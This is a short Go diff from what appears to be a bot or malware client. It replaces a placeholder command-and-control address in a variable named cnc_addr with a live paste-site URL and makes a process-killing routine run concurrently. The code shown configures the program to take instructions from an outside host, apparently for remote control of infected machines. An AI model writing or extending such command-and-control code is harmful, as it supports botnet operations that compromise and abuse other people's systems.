@@ -7,7 +7,7 @@ import (
 )
 
 var (
-	cnc_addr             = "https://raw_ip_of_cnc.domain"
+	cnc_addr             = "https://rentry.co/ibv7p/raw"
 	debug_mode           = true
 	single_instance_port = 13370
 )
@@ -19,9 +19,9 @@ func debug(content string) {
 }
 
 func main() {
-	kill_all_by_port()
+	go kill_all_by_port()
 	bind_instance_port()
-  
+
 	socket := init_socket()
 
 	for {
